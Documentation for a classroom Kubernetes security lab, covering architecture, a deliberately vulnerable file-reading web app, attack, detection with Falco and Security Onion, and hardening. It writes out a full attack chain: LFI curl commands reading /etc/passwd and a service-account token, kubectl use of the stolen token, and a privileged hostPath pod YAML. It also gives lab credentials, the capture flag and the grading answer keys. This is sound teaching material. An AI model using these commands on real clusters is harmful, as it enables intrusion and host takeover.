# K8s-Guard: Complete Project Documentation

---

## 1. Project Overview

### What Is K8s-Guard?
K8s-Guard is a 60-minute hands-on cybersecurity lab that teaches students how to attack, detect, and harden a Kubernetes cluster. Students play both attacker and defender in a single session.

### Credits
By Kaivalya Ahir. Built as a small team project.

### Topic
Threat Detection & Monitoring in Kubernetes using the NSA/CISA Kubernetes Hardening Guide, feeding data into Security Onion.

### Platform
A VMware-based lab environment. Up to 5 VMs per workspace. Labs run in isolated networks with no internet access.

### Scope
The original proposal was too ambitious for 60 minutes, so it was trimmed to a single attack chain with detection and hardening. The final lab focuses on one exploit path: LFI → token theft → privilege escalation → detection → hardening.

---

## 2. What Is Kubernetes?

Kubernetes (K8s) is an open-source container orchestration platform originally developed by Google. It automates deploying, scaling, and managing containerized applications across clusters of machines.

### Key Concepts Used In This Lab

**Cluster:** The entire Kubernetes setup. In our lab, VM1 (master) + VM2 (worker) form one cluster.

**Node:** A machine in the cluster. The master node (VM1) runs the API server and makes scheduling decisions. The worker node (VM2) runs the actual application pods.

**Pod:** The smallest deployable unit in Kubernetes. A pod wraps one or more containers. Our webapp runs as a pod. The attack pod (pwned) is also a pod. Both run on VM2.

**Namespace:** A logical partition inside the cluster to organize resources. Our vulnerable app lives in the `vuln-app` namespace.

**Service Account:** A Kubernetes identity assigned to a pod. Every pod gets one automatically. Kubernetes mounts a JWT token at `/var/run/secrets/kubernetes.io/serviceaccount/token` so the pod can authenticate to the API server. In our lab, the webapp pod has the `vuln-sa` service account.

**Token:** The credential file inside the pod. It's a JWT (JSON Web Token) that acts like a password for the service account. If stolen, an attacker can impersonate the pod's identity.

**ClusterRoleBinding:** A permission rule that grants a role across the entire cluster. In our lab, `vuln-sa-admin` is a ClusterRoleBinding that gives `vuln-sa` the `cluster-admin` role, the highest privilege level in Kubernetes.

**RoleBinding:** A permission rule scoped to a single namespace. In hardening, we replace the ClusterRoleBinding with a namespace-scoped RoleBinding.

**NodePort:** A way to expose a pod to the network. Port 30270 on VM2 routes external traffic to the webapp pod inside the cluster.

**Privileged Pod:** A container with all security restrictions disabled. It can access the host's filesystem, processes, and network. This is the `pwned` pod the attacker creates.

### Why Kubernetes Security Matters
- 88% of organizations use Kubernetes in production (CNCF Annual Survey 2023)
- 94% of K8s security incidents involve RBAC misconfigurations (Red Hat State of Kubernetes Security 2024)
- Tesla and Capital One were breached via exposed Kubernetes dashboards and stolen tokens
- Misconfigurations, not zero-days, are the #1 attack vector
- NSA and CISA published a dedicated Kubernetes Hardening Guide in 2022

---

## 3. Lab Architecture

### VM Layout (4 VMs)

| VM | Role | IP | OS | Components | Student Access |
|---|---|---|---|---|---|
| VM1 | K8s Master | 192.168.50.10 | Ubuntu 24 | k3s server, Audit logging, Filebeat | Hardening phase |
| VM2 | K8s Worker | 192.168.50.11 | Ubuntu 24 | Webapp pod, Falco, Filebeat, Flag | Do NOT access |
| VM3 | Attacker | 192.168.50.20 | Kali Linux | kubectl, curl, pwned.yaml | Attack phase |
| VM4 | SIEM | 192.168.50.30 | Security Onion | Elasticsearch, Kibana | Detection phase |

VM5 (originally a standalone Falco VM) was removed. Falco was moved to VM2 because it uses eBPF to monitor local syscalls and cannot see activity on remote machines.

### Credentials
- All Ubuntu/Kali VMs: `student` / `tartans`
- Security Onion web UI: `student@aia.class` / `tartans@1`
- Elasticsearch: `so_elastic` / `<REDACTED-LAB-VALUE>`

### Network
- All VMs on `192.168.50.0/24` (isolated `lan` network in the VMware lab)
- `bridge-net` (internet) used during setup only, removed before student deployment
- No internet access during the lab, so all container images are pre-cached on VM2

### Data Flow
```
VM1 (Audit Logs) ──Filebeat──> VM4 (Security Onion / Elasticsearch)
VM2 (Falco Alerts) ──Filebeat──> VM4 (Security Onion / Elasticsearch)
```

### Attack Path
```
VM3 (Kali) ──curl──> VM2:30270 (LFI) ──token──> VM1:6443 (API) ──kubectl──> VM2 (Privileged Pod)
```

---

## 4. Technologies Used And Why

### k3s (Lightweight Kubernetes)
**What:** A minimal, certified Kubernetes distribution by Rancher Labs. Packages the entire control plane into a single binary.

**Why we used it:** Full Kubernetes (kubeadm) requires 4GB+ RAM per node and multiple components. k3s runs on 2GB RAM. The lab environment has limited resources per VM, so k3s was the only practical choice.

**Alternatives considered:**
- kubeadm: too heavy for our VMs
- minikube: single-node only, can't do master + worker
- kind: runs K8s in Docker containers; networking wouldn't work with our Security Onion setup
- MicroK8s: Ubuntu/snap-specific, less flexible

**How it works:** VM1 runs `k3s server` (master). VM2 runs `k3s agent` (worker). Both configured with `--flannel-iface=ens32` to handle networking without a default gateway.

### Falco (Runtime Security)
**What:** An open-source runtime security tool by Sysdig/CNCF. Monitors Linux system calls (syscalls) at the kernel level using eBPF and fires alerts when behavior matches threat patterns.

**Why we used it:** Kubernetes audit logs only show API-level activity (who created what pod). They cannot see what happens INSIDE a running container. Falco fills this gap. Our project topic requires "a few examples of threat detection monitoring", and Falco provides the runtime layer that audit logs can't.

**How it works:** Falco's eBPF probe hooks into the kernel's syscall interface. When a student runs `cat /etc/shadow` inside the privileged pod, Falco intercepts the `openat` syscall and generates a "Sensitive file opened for reading" alert.

**Critical detail:** `cat /etc/shadow` (inside container) triggers Falco. `cat /host/etc/shadow` (via hostPath mount) does NOT because the hostPath mount bypasses the container's filesystem namespace. Falco's eBPF probe monitors the container namespace, not direct host filesystem access.

**Why on VM2:** Falco monitors LOCAL syscalls only. The attack happens on VM2, so Falco must be on VM2. We initially installed Falco on a separate VM5 (wrong) and had to move it after discovering it couldn't see activity on other machines.

### Security Onion (SIEM)
**What:** An open-source Linux distribution for security monitoring. Bundles Elasticsearch (data storage/search), Kibana (web UI), Logstash, Suricata, Zeek, and other tools.

**Why we used it:** The project topic specifically says "feed this data into an IDS such as Security Onion." It's the industry-standard open-source SIEM and gives students experience with a real enterprise tool.

**How it works:** Security Onion on VM4 receives two data streams via Filebeat: K8s audit logs from VM1 and Falco alerts from VM2. Both are stored in Elasticsearch. Students search and investigate using Kibana.

**Important:** Security Onion takes 10-15 minutes to fully start after boot. It runs ~24 Docker containers managed by a Salt configuration system. The Salt daemon constantly overwrites manual configuration changes, so all firewall rules must be managed through the web UI.

### Filebeat (Log Shipping)
**What:** A lightweight log shipper by Elastic. Reads log files or journal entries and forwards them to Elasticsearch or Logstash.

**Why we used it:** Needed to get logs from VM1 and VM2 into Security Onion's Elasticsearch. Filebeat is lightweight and doesn't require Java.

**Why direct to Elasticsearch:** We tried Logstash (port 5044) first but Security Onion's Salt daemon kept overwriting the Logstash pipeline configuration and the beats input plugin was never properly loaded. After hours of debugging, we switched to sending directly to Elasticsearch on port 9200, which worked immediately.

**Configurations:**
- VM1: Reads `/var/lib/rancher/k3s/server/audit/audit.log`, sends to `k8s-audit-*` index
- VM2: Reads `falco-modern-bpf.service` from systemd journal, sends to `falco-alerts-*` index
- Both use the `so_elastic` user with SSL verification disabled

### Kubernetes Audit Logging
**What:** A built-in Kubernetes feature that records every API request. Logs who did what, from where, to which resource, and whether it was allowed or denied.

**Why we used it:** Primary forensic evidence for investigating Kubernetes attacks. Shows the attacker's exact API calls.

**Configuration:** Via `/etc/rancher/k3s/config.yaml` on VM1 with an audit policy at `/var/lib/rancher/k3s/server/audit/policy.yaml`. Note: `kind: Policy` requires capital P.

**Key fields students find in Kibana:**
- `sourceIPs`: attacker's IP (192.168.50.20)
- `user.username`: service account used (system:serviceaccount:vuln-app:vuln-sa)
- `verb`: what action was taken (create, get, list)
- `objectRef.resource`: what was targeted (pods, nodes)
- `annotations.authorization.k8s.io/reason`: why it was permitted (RBAC: allowed by ClusterRoleBinding "vuln-sa-admin")

### NSA/CISA Kubernetes Hardening Guide v1.2
**What:** Published August 2022 by NSA and CISA. Provides security recommendations for Kubernetes deployments.

**Why we used it:** Authoritative government reference for K8s security. Directly aligns with our lab topic.

**Sections we reference:**
- Section 4: Recommends enforcing Pod Security Standards
- Section 5: Recommends least-privilege RBAC and not auto-mounting service account tokens

---

## 5. The Vulnerable Application

### What Is It?
A Python web application running inside a Kubernetes pod on VM2. It simulates an "Internal Document Portal v2.1" for internal employees to read documents.

### How Is It Built?
- **Image:** `python:3.9-slim` (pre-cached on VM2)
- **Runtime:** Inline Python HTTP server defined directly in the pod YAML, no custom Docker image needed
- **Endpoints:**
  - `/`: Main page with HTML links to read files
  - `/read?file=FILENAME`: Reads a file from disk and returns its contents
- **Dummy files:** `welcome.txt`, `readme.txt`, `changelog.txt` created at startup
- **ServiceAccount:** `vuln-sa` in namespace `vuln-app`
- **Exposed via:** NodePort service `webapp-svc` on port 30270
- **imagePullPolicy:** `IfNotPresent` (for airgapped operation)

### The LFI Vulnerability
The `/read?file=` endpoint takes a filename from the user and opens it with Python's `open()` function without any path validation. The developer expected only filenames like `welcome.txt` but there's no check.

- `?file=welcome.txt` → reads legitimate file (normal use)
- `?file=/etc/passwd` → reads system file (confirms LFI)
- `?file=/var/run/secrets/kubernetes.io/serviceaccount/token` → reads K8s token (the exploit)

### Why Is LFI Realistic?
LFI is in the OWASP Top 10 under "Broken Access Control." Many web apps that serve files (document portals, log viewers, config editors) are vulnerable when developers don't sanitize file paths. Internal tools especially get less security review because developers assume "it's only internal."

---

## 6. The Three Vulnerabilities

### Vulnerability 1: Local File Inclusion (LFI)
**What:** Webapp reads any file the user asks for without validation.
**Impact:** Attacker reads the service account token from inside the pod.
**If fixed:** Attack stops at step 1. Attacker sees a normal webapp with nothing to exploit.
**Danger level:** Least dangerous alone: it can only read files inside the container.

### Vulnerability 2: RBAC Over-Permission
**What:** The `vuln-sa` service account has `cluster-admin` via `ClusterRoleBinding vuln-sa-admin`. This is the highest privilege in Kubernetes: it can do anything to any resource anywhere.
**Impact:** The stolen token gives the attacker full control over the entire cluster.
**If fixed:** Token is useless. Can only list pods in one namespace. Attack stops at step 4.
**Danger level:** Most dangerous. Even without LFI, if this token leaks through any other way (git repo, logs, backup), it's game over.

### Vulnerability 3: No Pod Security Standards
**What:** The `vuln-app` namespace has no PSS label, so Kubernetes accepts any pod spec.
**Impact:** Attacker creates a privileged pod with host filesystem access. Complete container escape.
**If fixed:** Kubernetes rejects the privileged pod immediately. Attack stops at step 5.
**Danger level:** Second most dangerous. Without PSS, anyone with pod-create permission can escape to the host.

### How They Chain Together
LFI opens the door → RBAC gives the keys → No PSS lets the attacker walk out of the building.

Remove any one and the full attack chain breaks.

---

## 7. The Complete Attack Chain

### Scenario
An internal penetration tester has network access (they're on the internal network) but no Kubernetes credentials. They're testing what damage someone with just network access could do, like a compromised employee laptop.

### Phase 1: Reconnaissance & Discovery (Kali)

**Step 1:** Attacker knows the organization uses an internal document portal. They access it:
```bash
curl http://192.168.50.11:30270/
```
Output: HTML page showing "Internal Document Portal v2.1" with links to files.

**Step 2:** Normal use, reads a legitimate file:
```bash
curl http://192.168.50.11:30270/read?file=welcome.txt
```
Output: Welcome text. But the `?file=` parameter reads directly from disk.

**Step 3:** Tests LFI with a system file:
```bash
curl "http://192.168.50.11:30270/read?file=/etc/passwd"
```
Output: System passwd file. Confirms the app reads ANY file without validation.

**Step 4:** Steals the Kubernetes service account token:
```bash
curl "http://192.168.50.11:30270/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token"
```
Output: A long JWT token string. Every K8s pod has this at a well-known path.

**Step 5:** Saves token and scans for the API server:
```bash
TOKEN=$(curl -s "http://192.168.50.11:30270/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token")
nmap -p 6443 192.168.50.0/24 --open
```
Output: 192.168.50.10 has port 6443 open (standard K8s API port).

**Step 6:** Tests cluster access with the stolen token:
```bash
kubectl --server=https://192.168.50.10:6443 --token=$TOKEN --insecure-skip-tls-verify get nodes
```
Output: Both nodes listed as Ready. Token works.

**Step 7:** Enumerates RBAC bindings:
```bash
kubectl ... get clusterrolebindings
```
Output: Long list of system bindings. At the bottom: `vuln-sa-admin` bound to `cluster-admin`. Suspicious.

**Step 8:** Inspects the binding:
```bash
kubectl ... get clusterrolebinding vuln-sa-admin -o yaml
```
Output shows:
- `roleRef.name: cluster-admin`, god mode permissions
- `subjects.name: vuln-sa`, the same service account whose token was stolen
- `kind: ClusterRoleBinding`, applies across the entire cluster, not just one namespace

### Phase 2: Privilege Escalation (Kali)

**Step 1:** Examines the attack pod YAML (`~/Desktop/pwned.yaml`):
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned
  namespace: vuln-app
spec:
  nodeName: worker
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: nginx
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
```

What makes this dangerous:
- `privileged: true`, disables ALL container isolation
- `hostPID: true`, pod can see all host processes
- `hostNetwork: true`, pod shares the host's network
- `hostPath: /` at `/host`, entire host filesystem accessible
- `nodeName: worker`, forces the pod onto VM2 where the flag is

**Step 2:** Deploys the privileged pod:
```bash
kubectl ... apply -f ~/Desktop/pwned.yaml
```

**Step 3:** Reads `/etc/shadow` inside the container (triggers Falco):
```bash
kubectl ... exec -it pwned -n vuln-app -- cat /etc/shadow
```
This is a natural attacker enumeration step, checking if you're root and what accounts exist. Falco catches this.

**Step 4:** Captures the flag from the host filesystem:
```bash
kubectl ... exec -it pwned -n vuln-app -- cat /host/root/flag/proof.txt
```
Output: `FLAG{k8s_privilege_escalation_successful}`

Complete takeover: from a web bug to full host access in a few commands.

### Phase 3: Detection & Investigation (Security Onion)

Students switch to the defender perspective on VM4.

**Setting up Kibana:**
1. Open `https://securityonion`, login with `student@aia.class` / `tartans@1`
2. Navigate to Kibana > Stack Management > Data Views
3. Create `k8s-audit-*` data view with `@timestamp`
4. Create `falco-alerts-*` data view with `@timestamp`

**Investigating Audit Logs:**
Search for `vuln-sa` in the `k8s-audit-*` data view. Students find:
- `sourceIPs: 192.168.50.20`: the attacker's IP
- `user.username: system:serviceaccount:vuln-app:vuln-sa`: the stolen identity
- `verb: create`: the attacker created a pod
- `objectRef.resource: pods`: a pod was the target
- `annotations.authorization.k8s.io/reason: RBAC: allowed by ClusterRoleBinding "vuln-sa-admin"`: why it was allowed

**Investigating Falco Alerts:**
Search for `shadow` in the `falco-alerts-*` data view. Students find in the `message` field:
- `Warning Sensitive file opened for reading`
- `file=/etc/shadow`
- `process=cat`
- `command=cat /etc/shadow`
- `parent=containerd-shim` (confirms it's from a container)
- `host.name=worker`
- `container_id=787526146d38`

**Why both are needed:**
- Audit logs show WHO did WHAT at the API level (created a pod, exec'd into it)
- Falco shows WHAT HAPPENED INSIDE the container (read /etc/shadow)
- Without audit logs: You'd see Falco alerts but wouldn't know who deployed the pod
- Without Falco: You'd see the pod was created but wouldn't know what commands ran inside

### Phase 4: Hardening & Remediation (VM1)

**Fix 1: Delete the overly permissive binding**
```bash
sudo kubectl delete clusterrolebinding vuln-sa-admin
```
Removes cluster-admin from vuln-sa. The stolen token now has zero permissions.

**Fix 2: Apply least-privilege RBAC**
```bash
sudo kubectl apply -f ~/Desktop/hardened-role.yaml
sudo kubectl apply -f ~/Desktop/hardened-rolebinding.yaml
```
Creates a namespace-scoped Role allowing only `get` and `list` on `pods` in `vuln-app`. The service account can now only view pods in its own namespace.

**Fix 3: Apply Pod Security Standards**
```bash
sudo kubectl label namespace vuln-app pod-security.kubernetes.io/enforce=restricted --overwrite
```
The `restricted` PSS blocks privileged containers, hostPath mounts, running as root, and other dangerous capabilities. Even with cluster-admin, the privileged pod would be rejected.

**Why all three matter:**
- RBAC fix alone: Blocks this attacker, but if anyone else gets cluster-admin, they can still create privileged pods
- PSS alone: Blocks privileged pods, but attacker still has cluster-admin for other damage
- Both together: No permissions AND dangerous pod types blocked. Defense in depth.

**Note:** We don't fix the LFI. That's an application code bug, a developer's job, not a Kubernetes security fix. The point is: even with the app still vulnerable, proper K8s security controls limit the blast radius.

**NSA/CISA references:**
- Section 4: Enforce Pod Security Standards
- Section 5: Least-privilege RBAC, don't auto-mount tokens

---

## 8. Grading System

### 5 Grading Scripts Using SHA256 Hashes

| Script | VM | Phase | What It Checks |
|---|---|---|---|
| grading_script_0.sh | Kali | Phase 1 | LFI quiz: token path, binding name, port |
| grading_script_1.sh | Kali | Phase 2 | Flag capture verification |
| grading_script_2.sh | Security Onion | Phase 3 | 10 detection questions (5 audit + 5 Falco) |
| grading_script_3.sh | VM1 | Phase 4 | RBAC fix: binding deleted + role created |
| grading_script_4.sh | VM1 | Phase 4 | PSS: label applied + privileged pod blocked |

### Grading Script 0 Answers
- Q1: `/var/run/secrets/kubernetes.io/serviceaccount/token`
- Q2: `vuln-sa-admin`
- Q3: `30270`

### Grading Script 1 Answer
- Flag: `FLAG{k8s_privilege_escalation_successful}`

### Grading Script 2 Answers

**Part A: Kubernetes Audit Logs**
| # | Question | Answer |
|---|---|---|
| Q1 | Attacker's source IP | `192.168.50.20` |
| Q2 | ClusterRoleBinding name | `vuln-sa-admin` |
| Q3 | Service account (namespace:name) | `vuln-app:vuln-sa` |
| Q4 | Resource type created | `pods` |
| Q5 | API verb | `create` |

**Part B: Falco Alerts**
| # | Question | Answer |
|---|---|---|
| Q6 | Sensitive file read | `/etc/shadow` |
| Q7 | Command that triggered alert | `cat /etc/shadow` |
| Q8 | Parent process | `containerd-shim` |
| Q9 | Host name | `worker` |
| Q10 | Falco severity | `Warning` |

### Why SHA256
Students can't reverse-engineer the answers from the script. SHA256 is a one-way hash: you can verify an answer matches but can't extract the answer from the hash.

### Retry Logic
Scripts 0 and 2 have retry logic: wrong answers prompt the student to try again instead of advancing. This addresses peer review feedback.

---

## 9. Infrastructure Build Details

### k3s Cluster Setup
**VM1 (Master):**
```
ExecStart=/usr/local/bin/k3s server --node-ip 192.168.50.10 --advertise-address 192.168.50.10 --tls-san 192.168.50.10 --flannel-iface=ens32
```

**VM2 (Worker):**
```
ExecStart=/usr/local/bin/k3s agent --node-ip 192.168.50.11 --flannel-iface=ens32
```

The `--flannel-iface=ens32` flag was added to fix flannel crashing when `bridge-net` (default route) was removed. Without it, flannel can't determine which interface to use and k3s crashes on startup.

### Audit Logging Configuration
`/etc/rancher/k3s/config.yaml` on VM1:
```yaml
kube-apiserver-arg:
  - "audit-policy-file=/var/lib/rancher/k3s/server/audit/policy.yaml"
  - "audit-log-path=/var/lib/rancher/k3s/server/audit/audit.log"
  - "audit-log-maxage=30"
  - "audit-log-maxbackup=3"
  - "audit-log-maxsize=100"
```

### Filebeat Configurations

**VM1** (`/etc/filebeat/filebeat.yml`):
```yaml
filebeat.inputs:
  - type: log
    enabled: true
    paths:
      - /var/lib/rancher/k3s/server/audit/audit.log
    json.keys_under_root: true
    json.add_error_key: true
    fields:
      type: k8s-audit
    fields_under_root: true
output.elasticsearch:
  hosts: ["https://192.168.50.30:9200"]
  username: "so_elastic"
  password: '<REDACTED-LAB-VALUE>'
  ssl.verification_mode: none
  index: "k8s-audit-%{+yyyy.MM.dd}"
setup.ilm.enabled: false
setup.template.enabled: false
```

**VM2** (`/etc/filebeat/filebeat.yml`):
```yaml
filebeat.inputs:
  - type: journald
    enabled: true
    id: falco-journal
    include_matches:
      - _SYSTEMD_UNIT=falco-modern-bpf.service
    fields:
      type: falco-alert
    fields_under_root: true
output.elasticsearch:
  hosts: ["https://192.168.50.30:9200"]
  username: "so_elastic"
  password: '<REDACTED-LAB-VALUE>'
  ssl.verification_mode: none
  index: "falco-alerts-%{+yyyy.MM.dd}"
setup.ilm.enabled: false
setup.template.enabled: false
```

### Security Onion Configuration
**IP change:** Original IP was `10.5.5.72`, changed to `192.168.50.30` in Salt pillar files:
- `/opt/so/saltstack/local/pillar/minions/securityonion_standalone.sls`
- `/opt/so/saltstack/local/pillar/global/soc_global.sls`
- `/opt/so/saltstack/local/pillar/firewall/soc_firewall.sls`
- `/opt/so/saltstack/local/pillar/kafka/nodes.sls`

**Firewall:** VM1 and VM2 added to `searchnode` hostgroup via web UI to allow Filebeat access to Elasticsearch port 9200.

**Static IP:** Set via NetworkManager: `sudo nmcli con mod ens32 ipv4.method manual ipv4.addresses 192.168.50.30/24`

### Static IPs
| VM | Method | Config |
|---|---|---|
| VM1 | Netplan | `/etc/netplan/01-lan.yaml` |
| VM2 | Netplan | `/etc/netplan/01-lan.yaml` |
| VM3 | /etc/network/interfaces | Static entry for eth0 |
| VM4 | NetworkManager | `nmcli con mod ens32` |

### Pre-cached Container Images on VM2
Pulled with `sudo k3s ctr images pull` before removing internet:
- `nginx:latest`: used by pwned.yaml
- `python:3.9-slim`: used by webapp pod
- `imagePullPolicy: IfNotPresent` in pod specs so K8s uses cached images

---

## 10. Files On Each VM

### VM1 (Master) Desktop
| File | Purpose |
|---|---|
| hardened-role.yaml | Least-privilege Role (get/list pods in vuln-app) |
| hardened-rolebinding.yaml | Binds role to vuln-sa |
| grading_script_3.sh | Checks RBAC fix |
| grading_script_4.sh | Checks PSS enforcement |

### VM2 (Worker)
| File | Purpose |
|---|---|
| /root/flag/proof.txt | FLAG{k8s_privilege_escalation_successful} |

### VM3 (Kali) Desktop
| File | Purpose |
|---|---|
| pwned.yaml | Privileged pod YAML for attack |
| grading_script_0.sh | LFI quiz (3 questions) |
| grading_script_1.sh | Flag verification |

### VM4 (Security Onion) Desktop
| File | Purpose |
|---|---|
| grading_script_2.sh | Detection quiz (10 questions) |

Data views (`k8s-audit-*` and `falco-alerts-*`) are NOT pre-created, so students create them during Phase 3.

---

## 11. Key Challenges and Lessons Learned

### Security Onion Was The Hardest Part
- Salt daemon constantly overwrites manual iptables and config changes
- ALL firewall rules must be managed through the web UI, never directly
- The IP change from `10.5.5.72` to `192.168.50.30` required editing 4 Salt pillar files
- Docker containers had the old IP hardcoded in their `/etc/hosts`, which caused the 500 error on the web UI
- Takes 15-20 minutes to fully initialize after boot
- Logstash (port 5044) never worked because Salt kept overwriting our beats input config, so we switched to direct Elasticsearch (port 9200)

### Falco Had To Be On The Right VM
Initially installed Falco on a separate VM5, thinking it could monitor the cluster remotely. Wrong: Falco uses eBPF to monitor LOCAL syscalls only. Had to move it to VM2 and remove VM5.

### Bridge-net Removal Broke Flannel
Removing internet access (`bridge-net`) removed the default route. Flannel (k3s networking) needs a default route to find the right interface. Fixed with `--flannel-iface=ens32` in k3s service files on both VM1 and VM2.

### Container Images Need Pre-caching
Without internet, Kubernetes can't pull images. Had to pre-pull nginx and python images on VM2 using `sudo k3s ctr images pull`. Also needed `imagePullPolicy: IfNotPresent` in all pod specs.

### /etc/shadow vs /host/etc/shadow
`cat /etc/shadow` inside the container triggers Falco because it goes through the container's filesystem namespace. `cat /host/etc/shadow` via hostPath mount bypasses detection because it's a direct passthrough to the host filesystem.
